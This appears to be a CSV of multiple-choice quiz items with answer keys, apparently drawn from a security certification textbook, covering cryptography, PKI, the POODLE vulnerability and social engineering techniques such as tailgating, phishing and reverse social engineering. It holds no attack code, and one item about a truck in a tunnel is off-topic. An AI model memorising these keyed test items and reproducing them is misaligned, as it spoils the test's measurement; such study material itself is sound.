index,question,options,answer_key
364,Which of the following is an example of an inference attack where information is derived from ciphertext without decoding it?,"{'A': 'Using Carnivore to crack encrypted messages from a shipping company.', 'B': 'Assuming a shipping company is preparing for a large delivery due to increased encrypted traffic.', 'C': 'Employing John the Ripper to crack password hashes on a Unix system.', 'D': 'Utilizing L0phtcrack to compromise a PGP-encrypted system.'}",B
365,"According to the text, what key length is considered uncrackable by the U.S. government?","{'A': 'Shorter than 40 bits', 'B': 'Longer than 64 bits', 'C': 'At least 256 bits', 'D': 'Any key length if changed frequently'}",C
366,Which of the following describes the key characteristic of asymmetric encryption?,"{'A': 'It uses a single key for both encryption and decryption, making it fast for bulk encryption.', 'B': 'It encrypts data one bit at a time in a continuous stream, operating at high speeds.', 'C': 'It uses two keys, one for encryption and a different one for decryption, offering non-repudiation.', 'D': 'It combines data into blocks of 64 bits and encrypts them sequentially, which is slower than stream ciphers.'}",C
367,"Which of the following is a method for concealing a message within another file, making its existence unknown to most parties?","{'A': 'Hashing', 'B': 'Asymmetric encryption', 'C': 'Steganography', 'D': 'Diffie-Hellman key exchange'}",C
368,What is the primary purpose of a Certificate Authority (CA) within a Public Key Infrastructure (PKI)?,"{'A': 'To encrypt all data being exchanged between parties.', 'B': 'To create and issue digital certificates and manage their lifecycle.', 'C': 'To directly authenticate the identity of individuals without relying on certificates.', 'D': 'To distribute encryption keys solely to registration authorities (RAs).'}",B
369,"Which field within a digital certificate typically defines its intended use, such as encryption or digital signatures?","{'A': 'Subject', 'B': 'Serial Number', 'C': 'Key Usage', 'D': 'Issuer'}",C
370,What is the primary purpose of a digital signature as described in the text?,"{'A': 'To encrypt the entire message for confidentiality.', 'B': 'To ensure the authenticity and integrity of the sender.', 'C': 'To provide a secure channel for data transmission.', 'D': 'To authenticate the CA chain for trust validation.'}",B
371,Which of the following is NOT listed as an encrypted communication method in the text?,"{'A': 'Secure Shell (SSH)', 'B': 'Transport Layer Security (TLS)', 'C': 'Hypertext Transfer Protocol Secure (HTTPS)', 'D': 'Pretty Good Privacy (PGP)'}",C
372,"Which of the following is a mitigation strategy for the POODLE vulnerability, aiming to prevent it from being exploited by splitting data into smaller parts?","{'A': 'Implementing TLS_FALLBACK_SCSV', 'B': 'Disabling all SSL/TLS versions', 'C': 'Using RC4 cipher biases', 'D': 'Implementing anti-POODLE record splitting'}",D
373,"Which of the following is used to distribute a public key within the PKI system, verifying the user's identity to the recipient?","{'A': 'Digital signature', 'B': 'Hash value', 'C': 'Private key', 'D': 'Digital certificate'}",D
374,Which of the following is a symmetric encryption method that transforms a fixed-length amount of plain text into an encrypted version of the same length?,"{'A': 'Stream', 'B': 'Block', 'C': 'Bit', 'D': 'Hash'}",B
375,"In a Public Key Infrastructure (PKI), which entity is responsible for verifying an applicant?","{'A': 'Registration authority', 'B': 'User authority', 'C': 'Revocation authority', 'D': 'Primary authority'}",A
376,Which of the following describes the function of a Registration Authority (RA) within a Public Key Infrastructure (PKI)?,"{'A': ""It encrypts messages using the recipient's public key."", 'B': 'It establishes mutual trust between different Certificate Authorities.', 'C': ""It validates an applicant's identity and authorization to use a system."", 'D': 'It generates a 160-bit output value for hashing.'}",C
377,Which of the following best describes the problem encountered by the truck with the tunnel?,"{'A': 'The truck was too wide to fit through the tunnel.', 'B': ""The tunnel's structural integrity was compromised."", 'C': ""The truck's cargo was too heavy for the tunnel."", 'D': ""The truck's height exceeded the tunnel's overhead clearance.""}",D
378,"Which aspect of cybersecurity is identified as the weakest security link, often due to user actions?","{'A': 'Complex code listings', 'B': 'Server configurations', 'C': 'The users themselves', 'D': 'Physical security measures'}",C
379,What is the primary technique social engineers exploit to gain access to information or services?,"{'A': 'Sophisticated encryption algorithms', 'B': 'Exploiting vulnerabilities in network infrastructure', 'C': ""Manipulating people's natural desire to help and trust"", 'D': 'Cracking complex passwords through brute force attacks'}",C
380,Which of the following is NOT listed as a reason people fall victim to social engineering attacks?,"{'A': 'Trusting in others', 'B': 'Curiosity about new technology', 'C': 'Ignorance', 'D': 'Tendency to listen to authority'}",B
381,Which of the following is NOT listed as a reason people fall victim to social engineering attacks?,"{'A': 'Human nature (trusting in others)', 'B': 'Overconfidence in personal security knowledge', 'C': 'Fear (of consequences of not providing requested information)', 'D': 'Greed (promised gain for providing the requested information)'}",B
382,"Which cybersecurity practice, also known as ""TRASHINT,"" involves physically searching through discarded items to gather information?","{'A': 'Phishing', 'B': 'Dumpster diving', 'C': 'Social engineering', 'D': 'Impersonation'}",B
383,Which of the following is presented as a successful social engineering tactic for gaining system access?,"{'A': 'Posing as a law enforcement officer to intimidate employees into revealing passwords.', 'B': 'Impersonating a tech support person to offer unsolicited ""help"" with account security.', 'C': 'Pretending to be a repairman to gain physical access to restricted areas.', 'D': 'Claiming to be an executive to leverage perceived authority and gain credentials.'}",B
384,"When an attacker uses a fake badge to follow an authorized person through a security door, what is this technique called?","{'A': 'Vishing', 'B': 'Eavesdropping', 'C': 'Tailgating', 'D': 'Shoulder surfing'}",C
385,Which type of social engineering attack involves the attacker posing as an authority figure and prompting the target to initiate contact for support?,"{'A': 'Tailgating', 'B': 'Piggybacking', 'C': 'RFID skimming', 'D': 'Reverse social engineering'}",D
386,"In reverse social engineering, what is the typical purpose of the 'sabotage' step?","{'A': 'To create a false sense of urgency for the user to seek technical support.', 'B': 'To directly steal user login credentials.', 'C': ""To gather information about the user's network vulnerabilities."", 'D': ""To advertise the attacker's technical support services.""}",A
387,Which of the following is presented as a technique that can be effective in social engineering?,"{'A': 'Exploiting zero-day vulnerabilities', 'B': 'Using advanced encryption algorithms', 'C': 'Leveraging humor and a pleasant demeanor', 'D': 'Conducting sophisticated denial-of-service attacks'}",C
388,"What common, seemingly harmless item did a security audit team use to gain remote access to a company's computer infrastructure?","{'A': 'A USB drive with LED lamps', 'B': 'A complimentary software license', 'C': 'A discounted gift certificate', 'D': 'An invitation to a pizza party'}",A
389,"What does EC-Council identify as the most significant threat to security, due to their existing access and credentials within an organization?","{'A': 'External phishing campaigns targeting customers', 'B': 'Ransomware attacks encrypting critical data', 'C': 'Insider attacks from disgruntled employees', 'D': 'Malware spread through unpatched software vulnerabilities'}",C
390,What is the primary shared goal between a social engineer and a salesperson?,"{'A': 'To increase brand loyalty', 'B': 'To gather customer feedback', 'C': ""To convince someone to take an action they wouldn't normally take"", 'D': 'To improve product features based on consumer needs'}",C
391,Which type of insider threat is characterized by an individual intentionally introducing malware due to dissatisfaction with their employer?,"{'A': 'Negligent insider', 'B': 'Professional insider', 'C': 'Malicious insider', 'D': 'Compromised insider'}",C
392,"According to the text, what is a significant advantage an attacker has if they dedicate themselves to the task and apply for a job within an organization?","{'A': 'They can immediately access high-level security protocols.', 'B': 'They bypass many existing defenses because they are already trusted.', 'C': 'They can easily manipulate other employees through social engineering.', 'D': 'They have unlimited time to exploit vulnerabilities without detection.'}",B
393,Which of the following is NOT listed as a computer-based social engineering attack method?,"{'A': 'Hoax emails', 'B': 'Specially crafted pop-up windows', 'C': 'Physical intrusion into the office', 'D': 'Spoofing an entire website'}",C
394,"What type of social engineering attack involves frightening users into buying or downloading ""security software""?","{'A': 'Phishing', 'B': 'Scareware', 'C': 'Spear-phishing', 'D': 'Whaling'}",B
395,"Which social media activity, as described in the text, is utilized to gather information for a social engineering attack?","{'A': 'Sharing detailed work project updates.', 'B': 'Posting about personal hobbies and favorite activities.', 'C': 'Uploading pictures of food and personal outings.', 'D': 'Discussing opinions about workplace projects.'}",B
396,What is a common and simple method of computer-based social engineering that involves crafting emails to appear legitimate but contain malicious links or content?,"{'A': 'Spoofing', 'B': 'Phishing', 'C': 'Malware injection', 'D': 'Denial of Service'}",B
